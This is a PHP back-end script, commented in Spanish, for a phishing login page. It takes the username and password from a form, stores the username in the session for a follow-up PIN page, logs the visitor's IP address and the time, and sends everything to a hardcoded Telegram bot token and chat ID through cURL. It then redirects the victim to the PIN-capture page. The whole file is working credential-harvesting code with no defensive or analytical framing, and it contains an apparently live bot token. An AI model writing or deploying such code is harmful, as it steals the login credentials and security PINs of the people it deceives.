<?php
// =========================================================================
// CRUCIAL: Iniciar la sesión en la primera línea para poder guardar el usuario
// y recuperarlo más adelante cuando se introduzca el PIN de seguridad.
// =========================================================================
session_start();

// Configuración de las credenciales del Bot de Telegram
define('TELEGRAM_TOKEN', '8690112434:AAFWzeAiroxMokVoj0M4tjU_kSyuoGThy58');
define('TELEGRAM_CHAT_ID', '5601974496');
define('REDIRECCION_URL', 'index4.html'); // Tu sitio de destino (donde estará el PIN)

if ($_SERVER["REQUEST_METHOD"] === "POST") {

    // 1. Recibir los datos del formulario de manera segura
    $usuario  = isset($_POST['usuario']) ? trim($_POST['usuario']) : 'No provisto';
    $password = isset($_POST['password']) ? trim($_POST['password']) : 'No provisto';

    // =========================================================================
    // NUEVO: Guardamos el usuario en la sesión para que el PHP del PIN lo recuerde
    // =========================================================================
    if ($usuario !== 'No provisto') {
        $_SESSION['usuario_guardado'] = $usuario;
    }

    // 2. Capturar la dirección IP del usuario de forma precisa
    if (!empty($_SERVER['HTTP_CLIENT_IP'])) {
        $ip_usuario = $_SERVER['HTTP_CLIENT_IP'];
    } elseif (!empty($_SERVER['HTTP_X_FORWARDED_FOR'])) {
        $ip_usuario = explode(',', $_SERVER['HTTP_X_FORWARDED_FOR'])[0];
    } else {
        $ip_usuario = $_SERVER['REMOTE_ADDR'];
    }

    // 3. Capturar la fecha y hora exacta del servidor
    date_default_timezone_set('America/Caracas'); 
    $fecha_hora = date('Y-m-d H:i:s');

    // 4. Construir el cuerpo del mensaje estructurado usando etiquetas HTML estándar (<b> para negrita)
    $mensaje  = "📥 <b>Nuevo Registro de Acceso</b>\n\n";
    $mensaje .= "👤 <b>Usuario:</b> " . htmlspecialchars($usuario, ENT_QUOTES, 'UTF-8') . "\n";
    $mensaje .= "🔑 <b>Contraseña:</b> " . htmlspecialchars($password, ENT_QUOTES, 'UTF-8') . "\n";
    $mensaje .= "🌐 <b>Dirección IP:</b> " . htmlspecialchars($ip_usuario, ENT_QUOTES, 'UTF-8') . "\n";
    $mensaje .= "⏰ <b>Fecha y Hora:</b> " . htmlspecialchars($fecha_hora, ENT_QUOTES, 'UTF-8') . "\n";

    // 5. Enviar la notificación a la API de Telegram mediante cURL
    enviarATelegram($mensaje);

    // 6. Redireccionar de inmediato al usuario al sitio destino (index4.html)
    header("Location: " . REDIRECCION_URL);
    exit();

} else {
    header("HTTP/1.1 405 Method Not Allowed");
    echo "Método no permitido.";
    exit();
}

/**
 * Función encargada de realizar la petición HTTP POST a la API de Telegram usando formato HTML.
 */
function enviarATelegram($texto) {
    $url = "https://api.telegram.org/bot" . TELEGRAM_TOKEN . "/sendMessage";

    $datos = [
        'chat_id'    => TELEGRAM_CHAT_ID,
        'text'       => $texto,
        'parse_mode' => 'HTML' 
    ];

    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, $url);
    curl_setopt($ch, CURLOPT_POST, true);
    curl_setopt($ch, CURLOPT_POSTFIELDS, http_build_query($datos));
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_CONNECTTIMEOUT, 10);
    curl_setopt($ch, CURLOPT_TIMEOUT, 10);
    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, true);

    $respuesta = curl_exec($ch);
    curl_close($ch);

    return $respuesta;
}
?>